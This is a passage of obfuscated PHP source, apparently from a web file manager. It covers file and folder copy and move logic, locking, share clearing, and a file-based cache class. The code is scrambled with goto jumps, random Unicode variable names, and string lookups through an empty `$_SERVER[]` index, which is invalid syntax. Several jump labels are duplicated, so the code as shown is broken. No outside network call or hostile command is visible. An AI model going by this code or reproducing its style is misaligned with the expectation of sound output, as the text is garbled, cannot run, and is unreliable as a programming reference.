_lockKey($dݔЙ, $d݂ = 1) { $Bǯ = $_SERVER[][541] . md5($dݔЙ); if ($d݂) { if (isset(self::$_lockItemArr[$Bǯ])) { return; } self::$_lockItemArr[$Bǯ] = 1; CacheLock::lock($Bǯ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Bǯ])) { return; } unset(self::$_lockItemArr[$Bǯ]); CacheLock::unlock($Bǯ); } } public function isParentOf($eǪ, $F觋އ) { goto fеŢ; Cԇ: return $dվ; goto a՚; Dԣ: $f܉ = $Dɇʤ[$e[502]] . $Dɇʤ[$e[395]] . $e[47]; $c٭ = $c޶[$e[502]] . $c޶[$e[395]] . $e[47]; $dվ = strpos($c٭, $f܉) === 0; goto Cԇ; fеŢ: $e =& $_SERVER[]; $Dɇʤ = $this->sourceInfo($eǪ); $c޶ = $this->sourceInfo($F觋އ); goto Dԣ; a՚: } private $targetIsDelete = 0; public function copy($dƛϋ, $c, $aο = REPEAT_REPLACE, $f𦏖 = '') { goto b󊉢; E: $this->_childrenListClear(); $this->lockCopyEnd($dƛϋ); $this->lockWriteEnd($c, $b̭); goto F; b⍳: if (!$F || !$å⌉ || $å⌉[$Fʹ[403]] != $Fʹ[87]) { return !1; } if ($this->isParentOf($dƛϋ, $c)) { return !1; } $b̭ = $f𦏖 ? $f𦏖 : $F[$Fʹ[28]]; goto b; A: $this->saveAll($Aڪݛ[$Fʹ[544]]); Model($Fʹ[193])->linkAdd($Aڪݛ[$Fʹ[542]]); $this->folderSizeReset($c); goto cħ; b: $this->targetIsDelete = intval($F[$Fʹ[423]]); $AΚ = $this->fileNameExistCache($c, $F[$Fʹ[28]]); $f궑 = $this->_copy($dƛϋ, $c, $aο, $Aڪݛ, !0, $f𦏖); goto E; b󊉢: $Fʹ =& $_SERVER[]; $F = $this->sourceInfo($dƛϋ); $å⌉ = $this->sourceInfo($c); goto b⍳; cħ: $this->updateModifyTime($c); return $f궑; goto cؓ; F: if ($F[$Fʹ[403]] == $Fʹ[87] && $AΚ == $f궑) { $this->folderSizeResetChildren($AΚ); } Model($Fʹ[545])->addAll($Aڪݛ[$Fʹ[543]], array(), !0); if ($AΚ != $f궑 || $F[$Fʹ[403]] == $Fʹ[87]) { Model($Fʹ[546])->eventCopy($f궑); } goto A; b: $this->lockCopyStart($dƛϋ); $this->lockWriteStart($c, $b̭); $Aڪݛ = array($Fʹ[542] => array(), $Fʹ[543] => array(), $Fʹ[544] => array()); goto b; cؓ: } private function _copy($c, $Aқ, $dИ, &$AɌ, $D؉, $E뚦 = '') { goto D; a޿: return $Dګ; goto eʻ; Aȼ: $DѕÛ = $E뚦 ? $E뚦 : $d³[$Eզ[28]]; $cÕ = $this->fileNameExistCache($Aқ, $DѕÛ); if ($D؉) { $this->_childrenAllMake($c); if ($B׫ۚ && $cÕ) { $this->_childrenAllMake($cÕ); } } goto D; D: $Eզ =& $_SERVER[]; $d³ = $this->sourceInfoCache($c); $B׫ۚ = $d³[$Eզ[403]] == $Eզ[87]; goto Aȼ; D: if (!$cÕ) { return $this->_copyCreate($c, $Aқ, $DѕÛ, $AɌ); } $Dګ = $cÕ; if ($B׫ۚ) { if ($dИ == REPEAT_RENAME_FOLDER) { $DѕÛ = $this->fileNameAutoCache($Aқ, $DѕÛ, $dИ, $B׫ۚ); $Dګ = $this->_copyCreate($c, $Aқ, $DѕÛ, $AɌ); } else { $F = $this->_childrenList($c); foreach ($F as $F礼) { $this->_copy($F礼[$Eզ[395]], $cÕ, $dИ, $AɌ, !1); } } } else { if ($dИ == REPEAT_RENAME || $dИ == REPEAT_RENAME_FOLDER) { $DѕÛ = $this->fileNameAutoCache($Aқ, $DѕÛ, $dИ, $B׫ۚ); $Dګ = $this->_copyCreate($c, $Aқ, $DѕÛ, $AɌ); } else { if ($dИ == REPEAT_REPLACE) { $eܴ = $this->sourceInfoCache($cÕ); $C = $this->fileHistory($eܴ, $d³[$Eզ[447]], $d³[$Eզ[78]]); if ($C) { $AɌ[$Eզ[542]][] = $d³[$Eզ[447]]; } } else { if ($dИ == REPEAT_SKIP) { } } } Hook::trigger($Eզ[547], array($Eզ[548], $d³, 0)); } goto a޿; eʻ: } private function _copyCreate($E🹗, $f񴽃, $d꡺, &$F) { goto Cʕċ; aɈ: $this->_childrenListAll($E🹗, $dȸ); $C֏ = count($dȸ); if ($C֏ == 0) { return $e; } goto E; C: $e = $this->add($fÜ); $BӺ² = array($B[395] => $e, $B[28] => $d꡺); $this->_copyApplyMeta($BӺ², $F); goto dڬ܌; aӄ: $this->addAll($E߉, array(), !1); $Eĉ = $this->where(array($B[478] => $e))->select(); $A˧ = $this->_childrenMakeRelation($dȸ, $Eĉ); goto e; dڬ܌: if ($C[$B[403]] != $B[87]) { $F[$B[542]][] = $C[$B[447]]; return $e; } $dȸ = array(); $E߉ = array(); goto aɈ; Cֱ: $this->chunkEventSet($B[556], array($B[557], $fÜ, $C֏)); $this->saveAll($f߹); return $e; goto A凑; d: $fÜ = $this->_makeItemData($C, $c敋, $d꡺); Hook::trigger($B[549], $fÜ); Hook::trigger($B[550], array($B[551], $fÜ, 0)); goto C; Cʕċ: $B =& $_SERVER[]; $C = $this->sourceInfoCache($E🹗); $c敋 = $this->sourceInfoCache($f񴽃); goto d; F: foreach ($Eĉ as $D) { $c = $D[$B[395]]; $eъי = $this->_childrenMatch($A˧, $D, $F֋է); $DꊩՖ[] = array($B[395], $c, $B[478], $eъי[$B[478]]); $f߹[] = array($B[395], $c, $B[502], $eъי[$B[502]]); $this->_copyApplyMeta($D, $F); if ($D[$B[403]] != $B[87]) { $F[$B[542]][] = $D[$B[447]]; } } $this->chunkEventSet($B[554], array($B[555], $fÜ, $C֏)); $this->saveAll($DꊩՖ); goto Cֱ; E: $F֋է = $this->sourceInfo($e); foreach ($dȸ as $D) { $DΒ׌ = $this->_makeItemData($D, $F֋է, $D[$B[28]]); $DΒ׌[$B[502]] = $D[$B[502]]; $E߉[] = $DΒ׌; } $this->chunkEventSet($B[552], array($B[553], $fÜ, $C֏)); goto aӄ; e: $A˧[$E🹗] = $e; $DꊩՖ = array(); $f߹ = array(); goto F; A凑: } private function _childrenMakeRelation($eϱ, $Fɭ) { $A誚 =& $_SERVER[]; $fې = array(); $c = array(); foreach ($eϱ as $b𺐝ˊ) { $Bۣя = $b𺐝ˊ[$A誚[28]] . $A誚[8] . $b𺐝ˊ[$A誚[502]]; $fې[$Bۣя] = $b𺐝ˊ[$A誚[395]]; } foreach ($Fɭ as $b𺐝ˊ) { $Bۣя = $b𺐝ˊ[$A誚[28]] . $A誚[8] . $b𺐝ˊ[$A誚[502]]; $Cʫ = $fې[$Bۣя]; $c[$Cʫ] = $b𺐝ˊ[$A誚[395]]; } return $c; } private function _childrenMatch($A׉, $C鏯蹮, $C) { goto Bǩ; dՏب: $e = $FЙ[count($FЙ) - 1]; return array($c㐊ꅨ[478] => $e, $c㐊ꅨ[502] => $bϊϷ); goto E˾; Bǩ: $c㐊ꅨ =& $_SERVER[]; $bϊϷ = $C[$c㐊ꅨ[502]]; $B곆͏ = $this->parentLevelArray($C鏯蹮[$c㐊ꅨ[502]]); goto EʲƘ; EʲƘ: foreach ($B곆͏ as $Cň) { if (isset($A׉[$Cň])) { $bϊϷ .= $A׉[$Cň] . $c㐊ꅨ[558]; } } $bϊϷ = rtrim($bϊϷ, $c㐊ꅨ[47]) . $c㐊ꅨ[47]; $FЙ = $this->parentLevelArray($bϊϷ); goto dՏب; E˾: } private function _makeItemData($Cč, $c̥, $Bʪΰ) { $fծ =& $_SERVER[]; $C߻Ų = array($fծ[559] => $Cč[$fծ[403]], $fծ[413] => $Bʪΰ, $fծ[560] => $Cč[$fծ[405]], $fծ[448] => $Cč[$fծ[447]], $fծ[561] => $Cč[$fծ[78]], $fծ[562] => $c̥[$fծ[404]], $fծ[563] => $c̥[$fծ[484]], $fծ[564] => USER_ID, $fծ[565] => USER_ID, $fծ[394] => $c̥[$fծ[395]], $fծ[566] => $c̥[$fծ[502]] . $c̥[$fծ[395]] . $fծ[47], $fծ[417] => $Cč[$fծ[84]], $fծ[422] => 0, $fծ[567] => $fծ[33]); return $C߻Ų; } private function _copyApplyMeta($f, &$Aɂɚ) { $a =& $_SERVER[]; $FΟ = $f[$a[395]]; $bу埫 = $f[$a[28]]; if (!isset($f[$a[568]]) || !$f[$a[568]] || $f[$a[568]] == $a[191]) { $Aɂɚ[$a[544]][] = array($a[395], $FΟ, $a[568], short_id($FΟ)); } if (Input::check($bу埫, $a[569])) { $Aɂɚ[$a[543]][] = array($a[395] => $FΟ, $a[93] => $a[444], $a[372] => str_replace($a[50], $a[33], Pinyin::encode($bу埫))); $Aɂɚ[$a[543]][] = array($a[395] => $FΟ, $a[93] => $a[443], $a[372] => Pinyin::encode($bу埫, $a[570])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($dƧ) { goto e͓; e͓: $A̟ =& $_SERVER[]; $b = $this->sourceInfo($dƧ); $Dʸ = $A̟[424]; goto C۹ʗ; C۹ʗ: $D녬 = array($A̟[502] => array($A̟[525], $b[$A̟[502]] . $dƧ . $A̟[526]), $A̟[423] => $this->targetIsDelete); $Cꐛ = $this->field($Dʸ)->where($D녬)->select(); if (!$Cꐛ) { return; } goto F; F: $Cꐛ = array_to_keyvalue($Cꐛ, $A̟[395]); foreach ($Cꐛ as $Bꬩ) { $d = $Bꬩ[$A̟[478]]; $dƧ = $Bꬩ[$A̟[395]]; if (!isset($this->_childrenListCache[$dƧ]) && $Bꬩ[$A̟[403]] == $A̟[87]) { $this->_childrenListCache[$dƧ] = array(); } if (!isset($this->_childrenListCache[$d])) { $this->_childrenListCache[$d] = array(); } $this->_childrenListCache[$d][$dƧ] = $Bꬩ; $this->_childrenItemCache[$dƧ] = $Bꬩ; } goto D堦; D堦: } private function _childrenListAll($e҂飦, &$aċȂ) { $eԊ =& $_SERVER[]; if (!isset($this->_childrenListCache[$e҂飦])) { return; } $d = $this->_childrenListCache[$e҂飦]; foreach ($d as $c => $b梛) { $aċȂ[$c] = $b梛; if ($b梛[$eԊ[403]] == $eԊ[87]) { $this->_childrenListAll($c, $aċȂ); } } } private function sourceInfoCache($b) { if (isset($this->_childrenItemCache[$b])) { return $this->_childrenItemCache[$b]; } return $this->sourceInfo($b); } private function _childrenList($dѡ) { if (isset($this->_childrenListCache[$dѡ])) { return $this->_childrenListCache[$dѡ]; } return $this->_childrenListSelect($dѡ); } private function _childrenListSelect($f) { goto F; F: $bɹ =& $_SERVER[]; $aۛǴ = array($bɹ[478] => $f, $bɹ[423] => $this->targetIsDelete); $D݌ = $this->where($aۛǴ)->select(); goto aғɌ; aғɌ: $D݌ = $D݌ ? $D݌ : array(); $b = array_to_keyvalue($D݌, $bɹ[395]); $this->_childrenListCache[$f] = $b; goto A; A: foreach ($b as $f => $Dľҭ) { $this->_childrenItemCache[$f] = $Dľҭ; } return $b; goto A͛; A͛: } private function fileNameExistCache($Fŋ, $eᶾ) { $A =& $_SERVER[]; $eᶾ = strtolower($eᶾ); $a = $this->_childrenList($Fŋ); foreach ($a as $F̭) { if ($eᶾ == strtolower($F̭[$A[28]])) { return $F̭[$A[395]]; } } return !1; } private function fileNameAutoCache($Aۑ, $bĘߝ, $e㵖, $E呩ޢ) { $eϋ =& $_SERVER[]; $Eփ = $this->_childrenList($Aۑ); $Bͅ = array_to_keyvalue($Eփ, $eϋ[33], $eϋ[28]); return $this->fileNameAutoGet($Bͅ, $bĘߝ, $e㵖, $E呩ޢ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($cȖ, $DΡ, $EĊʻ = REPEAT_REPLACE, $fǙ = '') { goto cڊ; cڊ: $A， =& $_SERVER[]; $c𳗼ۈ = $this->sourceInfo($cȖ); $C͌ = $this->sourceInfo($DΡ); goto bޏ궫; A못: return $F; goto f㹬; Fɘ: $this->lockWriteStart($DΡ, $f); $Eײ = array($A，[542] => array(), $A，[573] => !1); $this->clearShare($cȖ, $DΡ); goto dѧ; F֊: $this->updateModifyTime($DȻԯ); Model($A，[546])->eventMove($cȖ, $c𳗼ۈ[$A，[478]], $DΡ); Hook::trigger($A，[572], $d͍); goto A못; bޏ궫: if ($c𳗼ۈ[$A，[478]] == $C͌[$A，[395]]) { if ($c𳗼ۈ[$A，[423]] == $A，[87]) { Model($A，[421])->restore(array($cȖ)); } if (!$fǙ || $fǙ == $c𳗼ۈ[$A，[28]]) { return $cȖ; } } $d͍ = $this->pathInfoMore($cȖ); if ($this->isParentOf($cȖ, $DΡ)) { return !1; } goto a; a񎺨: if ($c𳗼ۈ[$A，[403]] == $A，[87] && $Dَ) { $this->folderSizeResetChildren($F); } Model($A，[193])->linkAdd($Eײ[$A，[542]]); if ($Dَ && $Eײ[$A，[573]]) { $this->removeNow($cȖ, !1); } goto f̱̑; DŽ: $this->folderSizeReset($DΡ); $DȻԯ = array($c𳗼ۈ[$A，[478]], $DΡ); if ($c𳗼ۈ[$A，[403]] == $A，[87]) { $DȻԯ[] = $cȖ; } goto F֊; dѧ: $Dَ = $this->fileNameExistCache($DΡ, $c𳗼ۈ[$A，[28]]); $F = $this->_move($cȖ, $DΡ, $EĊʻ, $Eײ, $fǙ); $this->sourceCacheClear(); goto a񎺨; f̱̑: $this->lockMoveEnd($cȖ); $this->lockWriteEnd($DΡ, $f); $this->folderSizeReset($c𳗼ۈ[$A，[478]]); goto DŽ; d֚: if ($c𳗼ۈ[$A，[478]] == $DΡ && $fǙ != $c𳗼ۈ[$A，[28]]) { $B񮱐 = $this->fileNameExist($DΡ, $fǙ); if ($B񮱐 && $c𳗼ۈ[$A，[403]] == $A，[191]) { goto E; B睊: return $B񮱐; goto B; E: $e = $this->sourceInfo($B񮱐); $FՔܚ = $this->fileHistory($e, $c𳗼ۈ[$A，[447]], $c𳗼ۈ[$A，[78]]); if (!$FՔܚ) { Model($A，[450])->remove($c𳗼ۈ[$A，[447]]); } goto b򶗳; b򶗳: $this->removeNow($cȖ, !1); $this->folderSizeReset($DΡ); Hook::trigger($A，[572], $d͍); goto B睊; B: } } $f = $fǙ ? $fǙ : $c𳗼ۈ[$A，[28]]; $this->lockMoveStart($cȖ); goto Fɘ; a: if (!$c𳗼ۈ || !$C͌ || $C͌[$A，[403]] != $A，[87]) { return !1; } Hook::trigger($A，[571], $d͍); $this->targetIsDelete = intval($c𳗼ۈ[$A，[423]]); goto d֚; f㹬: } private function _move($b, $c, $AĬ򞤂, &$d, $Cޞϵ = '') { goto F۽; d̟̈́: return $bʲ; goto Eݷ; Aִ: $f = !1; if ($D͛) { if ($AĬ򞤂 == REPEAT_RENAME_FOLDER) { $F֥ = $this->fileNameAuto($c, $F֥, $AĬ򞤂, $D͛); $bʲ = $this->_moveForce($b, $c, $F֥); } else { if ($AĬ򞤂 == REPEAT_RENAME_FOLDER) { $AĬ򞤂 = REPEAT_RENAME; } $E = $this->_childrenListSelect($b); foreach ($E as $aߣ؟) { $this->_move($aߣ؟[$b[395]], $cұ, $AĬ򞤂, $d); } $f = !0; } } else { if ($AĬ򞤂 == REPEAT_SKIP) { $f = !0; } else { if ($AĬ򞤂 == REPEAT_RENAME || $AĬ򞤂 == REPEAT_RENAME_FOLDER) { $F֥ = $this->fileNameAuto($c, $F֥, $AĬ򞤂, $D͛); $bʲ = $this->_moveForce($b, $c, $F֥); } else { if ($AĬ򞤂 == REPEAT_REPLACE) { $Eꂖ = $this->sourceInfoCache($cұ); $cޥթ = $this->fileHistory($Eꂖ, $a[$b[447]], $a[$b[78]]); if ($cޥթ) { $d[$b[542]][] = $a[$b[447]]; } else { $f = !0; } } } } } if ($f && !$d[$b[573]]) { $d[$b[573]] = !0; } goto d̟̈́; F۽: $b =& $_SERVER[]; $a = $this->sourceInfo($b); $D͛ = $a[$b[403]] == $b[87]; goto d; b׋: $this->lockWriteStart($c, $F֥); if (!$cұ) { return $this->_moveForce($b, $c, $F֥); } $bʲ = $cұ; goto Aִ; d: $F֥ = $Cޞϵ ? $Cޞϵ : $a[$b[28]]; $cұ = $this->fileNameExistCache($c, $F֥); $this->lockMoveStart($b); goto b׋; Eݷ: } private function _moveForce($Eʹݎ, $CԞ, $F) { goto E; aߺ: if (!$CǑ && $this->moveClearAuth) { Model($a[482])->authClear($Eʹݎ); } $eɅ = $f؄[$a[423]] == $a[87] && $d٦[$a[423]] != $a[87]; if ($eɅ) { $b[$a[422]] = 0; } goto fȥ; E: $a =& $_SERVER[]; $f؄ = $this->sourceInfo($Eʹݎ); $d٦ = $this->sourceInfo($CԞ); goto fԢؚ; fȥ: if ($fɛ) { $A͟޾ = array($a[566] => array($a[525], $f؄[$a[502]] . $f؄[$a[395]] . $a[526])); $A깇ۉ = $f؄[$a[502]] . $f؄[$a[395]] . $a[47]; $e = $d٦[$a[502]] . $d٦[$a[395]] . $a[47] . $f؄[$a[395]] . $a[47]; $E㾉 = array($a[566] => array($a[574], "\162\145\160\154\x61\x63\x65\x28\160\x61\x72\145\156\164\x4c\x65\x76\x65\x6c\x2c\x27{$A깇ۉ}\x27\x2c\47{$e}\47\x29"), $a[562] => $d٦[$a[404]], $a[563] => $d٦[$a[484]]); if ($eɅ) { $E㾉[$a[422]] = 0; } $this->where($A͟޾)->data($E㾉)->save(); } $this->where(array($a[410] => $Eʹݎ))->data($b)->save(); return $Eʹݎ; goto fɒ; fԢؚ: $fɛ = $f؄[$a[403]] == $a[87]; $b = array($a[394] => $d٦[$a[395]], $a[566] => $d٦[$a[502]] . $d٦[$a[395]] . $a[47], $a[562] => $d٦[$a[404]], $a[563] => $d٦[$a[484]], $a[565] => USER_ID, $a[413] => $F); $CǑ = $f؄[$a[404]] == SourceModel::TYPE_GROUP && $d٦[$a[404]] == SourceModel::TYPE_GROUP && $f؄[$a[484]] == $d٦[$a[484]]; goto aߺ; fɒ: } private function clearShare($C, $a) { goto Eׄ; eŦ: if ($A眊[$eմ[484]] == $F戎ȑ[$eմ[484]] && $A眊[$eմ[404]] == $eմ[575]) { return; } $b筇˛ = array($eմ[502] => array($eմ[525], $A眊[$eմ[502]] . $C . $eմ[526])); $cŋ = $this->field($eմ[410])->where($b筇˛)->getField($eմ[395], !0); goto fÄ; Eׄ: $eմ =& $_SERVER[]; $A眊 = $this->sourceInfo($C); $F戎ȑ = $this->sourceInfo($a); goto eŦ; fÄ: if (!$cŋ) { return; } $b筇˛ = array($eմ[395] => array($eմ[7], $cŋ), $eմ[475] => 1); $d쨵 = Model($eմ[576])->field($eմ[468])->where($b筇˛)->select(); goto Bɍ޸; Bɍ޸: if (!$d쨵) { return; } $d쨵 = array_to_keyvalue($d쨵, $eմ[33], $eմ[468]); $b筇˛ = array($eմ[468] => array($eմ[7], $d쨵)); goto B; B: Model($eմ[576])->where($b筇˛)->save(array($eմ[475] => 0)); Model($eմ[577])->where($b筇˛)->delete(); goto dͦ; dͦ: } public function copyFolderFromIO($a, $d, $bƕ孃, $e͌, $Dݑ, $a = false) { goto C۝; c幻: $this->updateModifyTime($bƕ孃); return $BҰ; goto a; Bևߓ: if ($cĚ) { $this->_childrenAllMake($cĚ); } Hook::trigger($f[579]); $this->_copyChildTo($a, $d, $BҰ, $e͌, $c, $Dݑ); goto Fˋ; bԚ: Model($f[545])->addAll($c[$f[543]], array(), !0); Model($f[546])->eventCopy($BҰ); $this->saveAll($c[$f[544]]); goto Eҿ; C۝: $f =& $_SERVER[]; $c = array($f[543] => array(), $f[544] => array(), $f[542] => array(), $f[578] => array()); $B蚄 = $a ? $a : $a->pathThis($d); goto DЃ; Eҿ: Model($f[450])->linkAdd($c[$f[542]]); Model($f[450])->remove($c[$f[578]]); $this->folderSizeReset($bƕ孃); goto c幻; DЃ: $cĚ = $this->fileNameExist($bƕ孃, $B蚄); $BҰ = $this->mkdir($bƕ孃, $B蚄, $e͌); if (!$cĚ || $e͌ == REPEAT_RENAME_FOLDER) { $e͌ = !1; } goto Bևߓ; Fˋ: Hook::trigger($f[580]); if ($BҰ) { $this->folderSizeResetChildren($BҰ); } $this->_childrenListClear(); goto bԚ; a: } private function _copyChildTo($D囡, $cɋ, $Fᡦ, $c, &$Bͼ̕, $bԽ閃) { goto eĉ; F: if (!empty($B͕)) { $this->addAll($B͕); $this->_childrenListSelect($Fᡦ); } $E = $this->_childrenList($Fᡦ); $E = array_to_keyvalue($E, $E܄[28]); goto DŴЋ; eĉ: $E܄ =& $_SERVER[]; $C췾 = $this->sourceInfoCache($Fᡦ); $f޼ӈ = $D囡->listPath($cɋ); goto f; DŴЋ: foreach ($a嚆֫ as $AϾљ) { $bٜ = $E[$AϾљ[$E܄[28]]]; $eᎃ߈ = $bٜ[$E܄[395]]; $this->_copyApplyMeta($bٜ, $Bͼ̕); if ($AϾљ[$E܄[29]] == $E܄[77]) { $AϾљ[$E܄[76]] = $D囡->getPathInner($AϾљ[$E܄[76]]); $this->_copyChildTo($D囡, $AϾљ[$E܄[76]], $eᎃ߈, $c, $Bͼ̕, $bԽ閃); } } goto Aͳ; Bɲ: $B͕ = array(); foreach ($a嚆֫ as &$AϾљ) { goto Eߑߎ; Cǌ: if ($c) { $aӭ = $this->fileNameExistCache($Fᡦ, $AϾљ[$E܄[28]]); if ($aӭ) { if ($AϾљ[$E܄[403]] || $c == REPEAT_SKIP) { continue; } if ($c == REPEAT_REPLACE) { $bٜ = $this->sourceInfoCache($aӭ); $fǏ = $this->fileHistory($bٜ, $AϾљ[$E܄[447]], $AϾљ[$E܄[78]]); if ($fǏ) { $Bͼ̕[$E܄[542]][] = $AϾљ[$E܄[447]]; } continue; } else { if ($c == REPEAT_RENAME) { $AϾљ[$E܄[28]] = $this->fileNameAutoCache($Fᡦ, $AϾљ[$E܄[28]], $c, !1); } } } } if (!$AϾљ[$E܄[403]] && $AϾљ[$E܄[447]]) { $Bͼ̕[$E܄[542]][] = $AϾљ[$E܄[447]]; } $B͕[] = $this->_makeItemData($AϾљ, $C췾, $AϾљ[$E܄[28]]); goto A⤒; fܨ: $AϾљ[$E܄[78]] = _get($AϾљ, $E܄[78], 0); $AϾљ[$E܄[447]] = _get($AϾљ, $E܄[447], 0); if (!isset($AϾљ[$E܄[581]]) && $AϾљ[$E܄[447]]) { $Bͼ̕[$E܄[578]][] = $AϾљ[$E܄[447]]; } goto Cǌ; Eߑߎ: if (isset($eƩе[$AϾљ[$E܄[28]]])) { $AϾљ = $eƩе[$AϾљ[$E܄[28]]]; } $AϾљ[$E܄[403]] = $AϾљ[$E܄[29]] == $E܄[77]; $AϾљ[$E܄[405]] = _get($AϾљ, $E܄[168], $E܄[33]); goto fܨ; A⤒: } unset($AϾљ); goto F; f: $f޼ӈ = $f޼ӈ ? $f޼ӈ : array($E܄[74] => array(), $E܄[75] => array()); $a嚆֫ = array_merge($f޼ӈ[$E܄[74]], $f޼ӈ[$E܄[75]]); $eƩе = $this->_addFiles($D囡, $f޼ӈ[$E܄[74]], $bԽ閃); goto Bɲ; Aͳ: } private function _addFiles($BӋڤ, $aљ, $fڧ) { goto b屾; dޞ: $cñ->addAll($A); $fȓѥ = array($CھЈ[170] => array($CھЈ[7], array_keys($e))); $F´ = $cñ->where($fȓѥ)->select(); goto eθ; C: foreach ($F´ as $dݰ) { if (!isset($e[$dݰ[$CھЈ[170]]])) { continue; } $b = $e[$dݰ[$CھЈ[170]]]; foreach ($b as &$C) { $C[$CھЈ[447]] = $dݰ[$CھЈ[447]]; $C[$CھЈ[581]] = !0; } unset($C); } $A = array(); foreach ($aљ as $D) { if (isset($D[$CھЈ[581]]) && $D[$CھЈ[581]]) { continue; } $dꐿ = $BӋڤ->getPathInner($D[$CھЈ[76]]); $Aڻ = $cñ->addFileMake($dꐿ, $D[$CھЈ[78]], $D[$CھЈ[171]], $D[$CھЈ[170]], $D[$CھЈ[28]], $fڧ); $A[] = $Aڻ; } goto dޞ; E: foreach ($aљ as &$C) { goto Bń; dҢ֒: $C[$CھЈ[170]] = $b狵隭; Hook::trigger($CھЈ[583], $C); $e[$b狵隭][] =& $C; goto A򑠽; Eڍ: $b狵隭 = $BӋڤ->hashMd5($C[$CھЈ[76]]); if (strlen($b狵隭) > 10 && !isset($e[$b狵隭])) { $e[$b狵隭] = array(); } $C[$CھЈ[171]] = $c; goto dҢ֒; A򑠽: if (count($e[$b狵隭]) > 1) { $C[$CھЈ[581]] = !0; } goto Bɟօ; Bń: Hook::trigger($CھЈ[582], $C); $C[$CھЈ[76]] = $BӋڤ->getPathInner($C[$CھЈ[76]]); $c = $BӋڤ->hashSimple($C[$CھЈ[76]]); goto Eڍ; Bɟօ: } unset($C); $fȓѥ = array($CھЈ[170] => array($CھЈ[7], array_keys($e))); goto B; Eȕ: foreach ($aљ as $b̽) { $D[$b̽[$CھЈ[28]]] = $b̽; } return $D; goto eަ; eθ: $F´ = $F´ ? $F´ : array(); foreach ($F´ as $dݰ) { if (!isset($e[$dݰ[$CھЈ[170]]])) { continue; } $aȴ =& $e[$dݰ[$CھЈ[170]]]; foreach ($aȴ as &$C) { $C[$CھЈ[447]] = $dݰ[$CھЈ[447]]; } unset($C); } $D = array(); goto Eȕ; b屾: $CھЈ =& $_SERVER[]; if (!$aљ || count($aљ) == 0) { return array(); } $e = array(); goto E; B: $cñ = Model($CھЈ[584]); $F´ = $cñ->where($fȓѥ)->select(); $F´ = $F´ ? $F´ : array(); goto C; eަ: } } define($_SERVER[][585], $_SERVER[][586]); goto Cڜ; BۆɄ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto AЗ; AЗ: $eو =& $_SERVER[]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Cι; C: switch ($E۪ԯ[$eو[797]]) { case $eو[17]: self::$handle = Model($eو[799]); break; case $eو[800]: self::$handle = new CacheRedis($d㻹ג, $D); break; case $eو[801]: self::$handle = new CacheMemcached($d㻹ג, $D); break; case $eو[193]: self::$handle = new CacheFile($d㻹ג, $D); break; default: break; } return self::$handle; goto AƯ; Cι: $E۪ԯ = $GLOBALS[$eو[6]][$eو[347]]; $d㻹ג = $E۪ԯ[$E۪ԯ[$eو[797]]]; $D = $E۪ԯ[$eو[798]]; goto C; AƯ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($AŚ) { if (is_array($AŚ) || is_object($AŚ)) { $AŚ = json_encode($AŚ); } $AŚ = rawurlencode($AŚ); return md5(KOD_SITE_ID . $_SERVER[][71] . $AŚ); } public static function get($aʈ, $c뱾 = false) { $B = self::key($aʈ); if ($c뱾) { return unserialize(self::init()->get($B)); } if (!isset(self::$memoryCache[$B])) { $cȟ = self::init()->get($B); self::$memoryCache[$B] = unserialize($cȟ); } return self::$memoryCache[$B]; } public static function set($C䤄, $dش܆, $cɟ = false) { goto d; d: $f = self::key($C䤄); if (isset(self::$memoryCache[$f]) && self::$memoryCache[$f] === $dش܆) { return !0; } if ($cɟ === 0) { self::$memoryCache[$f] = $dش܆; return !0; } goto e͌; e͌: CacheLock::lock($C䤄); $d = self::init()->set($f, serialize($dش܆), $cɟ); self::$memoryCache[$f] = $dش܆; goto b햢; b햢: CacheLock::unlock($C䤄); return $d; goto fĠ; fĠ: } public static function getCall($bϑ, $FАĐ, $F߭, $aϝ = array()) { goto Cܙ; aƚ: $A͊ = call_user_func_array($F߭, $aϝ); $A͊ = $A͊ ? $A͊ : $dΪȭ[33]; self::set($bϑ, $A͊, $FАĐ); goto a; a: return $A͊; goto d; Cܙ: $dΪȭ =& $_SERVER[]; $A͊ = self::get($bϑ); if ($A͊ || $A͊ === $dΪȭ[33]) { return $A͊; } goto aƚ; d: } public static function remove($e) { goto Aю; bь: return $C; goto B⫗맃; dͧ: CacheLock::lock($e); $C = self::init()->remove($EЌذ); CacheLock::unlock($e); goto bь; Aю: $EЌذ = self::key($e); unset(self::$memoryCache[$EЌذ]); self::clearTimeout(); goto dͧ; B⫗맃: } public static function removeMemory($Bõ) { $bҙ = self::key($Bõ); unset(self::$memoryCache[$bҙ]); } public static function clearMemory($f = false) { if ($f) { $f = self::key($f); unset(self::$memoryCache[$f]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[][802])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[][803])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($D³, $B) { $a𮭕 =& $_SERVER[]; $this->cachePath = $D³[$a𮭕[76]]; $this->prefix = $a𮭕[804]; $this->cacheTime = $B; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($c䑊) { $Aڪ =& $_SERVER[]; $c䑊 = str_replace(array($Aڪ[805], $Aڪ[97], $Aڪ[70]), $Aڪ[806], $c䑊); return $this->cachePath . $Aڪ[807] . $c䑊 . $Aڪ[808]; } public function set($D, $aԂ, $Bֳʻ = false) { $E = $this->getFile($D); if (file_put_contents($E, $this->prefix . $aԂ, LOCK_EX)) { @touch($E, intval(time() + $Bֳʻ)); clearstatcache(); return !0; } @unlink($E); return !1; } public function get($dӨ) { $F = $this->getFile($dӨ); if (file_exists($F) && filemtime($F) < time()) { @unlink($F); return !1; } $B͉ = @file_get_contents($F); return substr($B͉, strlen($this->prefix)); } public function remove($Ë́) { $d = $this->getFile($Ë́); return @unlink($d); } public function deleteAll() { $CԾ䂦 =& $_SERVER[]; $F = scandir($this->cachePath); foreach ($F as $aݢ) { $dƸ = $this->cachePath . $aݢ; if (strpos($dƸ, $CԾ䂦[808]) && strpos($dƸ, $CԾ䂦[809])) { @unlink($dƸ); } } } public function clearTimeout() { $fαߏ =& $_SERVER[]; $D襳 = scandir($this->cachePath); 